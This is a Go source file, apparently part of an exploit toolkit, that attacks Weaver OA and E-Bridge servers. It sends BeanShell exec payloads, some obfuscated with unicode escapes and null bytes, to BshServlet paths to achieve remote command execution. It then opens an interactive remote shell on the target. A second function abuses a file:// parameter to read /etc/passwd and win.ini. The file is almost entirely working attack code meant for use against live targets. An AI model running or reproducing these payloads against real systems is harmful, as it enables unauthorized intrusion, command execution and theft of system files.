package weaver

import (
	"crypto/tls"
	"fmt"
	"github.com/go-resty/resty/v2"
	"goexploit/common"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

func WeaverScanner() {

}
func bshRCEChecker() bool {
	vulPath := []string{"/weaver/bsh.servlet.BshServlet", "/weaveroa/bsh.servlet.BshServlet", "/oa/bsh.servlet.BshServlet"}
	payloads := []string{`bsh.script=exec("%s");&bsh.servlet.output=raw`, `bsh.script=\u0065\u0078\u0065\u0063("%s");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw`, `bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=%s`}
	var isVul bool = false
	client := resty.New().EnableTrace().SetTimeout(time.Duration(common.Args.TimeOut)*time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}).SetHeader("User-Agent", common.Args.UA).SetProxy(common.Args.Proxy)
	for _, path := range vulPath {
		resp, err := client.R().Get(common.Args.Target + path)
		if err != nil || resp.StatusCode() != http.StatusOK {
			continue
		}
		for _, payload := range payloads {
			resp, err = client.R().SetHeader("Content-Type", "application/x-www-form-urlencoded").SetHeader("Refere", common.Args.Target).SetHeader("Update-Insecure-Requests", "1").SetBody(strings.Replace(payload, "%s", "echo fuckyou", -1)).Post(common.Args.Target + path)
			if err != nil || resp.StatusCode() != http.StatusOK {
				continue
			}
			if strings.Contains(string(resp.Body()), "fuckyou") {
				isVul = true
				fmt.Printf("[+] vulPath:%s\nvulPayload:%s\n", path, payload)
				if common.Args.Exploit {
					weaverShell(client, path, payload)
				}
			}
		}
	}
	return isVul
}
func EBridgeFileRead() bool {
	vulPath := `/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://%s&fileExt=txt`
	fusePath := map[string]string{"Linux": `/etc/passwd`, "Windows": "/C://windows/win.ini", "Other": "/"}
	isVul := false
	client := resty.New().SetTimeout(time.Duration(common.Args.TimeOut)*time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}).SetHeader("Content-Type", "application/x-www-form-urlencoded").SetHeader("User-Agent", common.Args.UA)
	LResp, err := client.R().Get(common.Args.Target + fmt.Sprintf(vulPath, fusePath["Linux"]))
	if err != nil {
		log.Fatalln(err)
	}
	WResp, err := client.R().Get(common.Args.Target + fmt.Sprintf(vulPath, fusePath["Windows"]))
	if err != nil {
		log.Fatalln(err)
	}
	OResp, err := client.R().Get(common.Args.Target + fmt.Sprintf(vulPath, fusePath["Other"]))
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Println(LResp, WResp, OResp)
	return isVul
}
func weaverShell(client *resty.Client, path string, payload string) {
	command := ""
	for {
		fmt.Print("# ")
		fmt.Scanf("%s\n", &command)
		switch command {
		case "quit", "exit":
			os.Exit(0)
		default:
			resp, err := client.R().SetHeader("Content-Type", "application/x-www-form-urlencoded").SetHeader("Refere", common.Args.Target).SetHeader("Update-Insecure-Requests", "1").SetBody(strings.Replace(payload, "%s", command, -1)).Post(common.Args.Target + path)
			if err != nil || resp.StatusCode() != http.StatusOK {
				fmt.Println("Something Wrong,Run Command Failed")
				continue
			}
			reg, err := regexp.CompilePOSIX("<pre>(.*?)</pre>")
			if err != nil {
				fmt.Println("Something Wrong,Run Command Failed")
				continue
			}
			result := reg.FindStringSubmatch(string(resp.Body()))[1]
			fmt.Println(result)
		}
	}
}
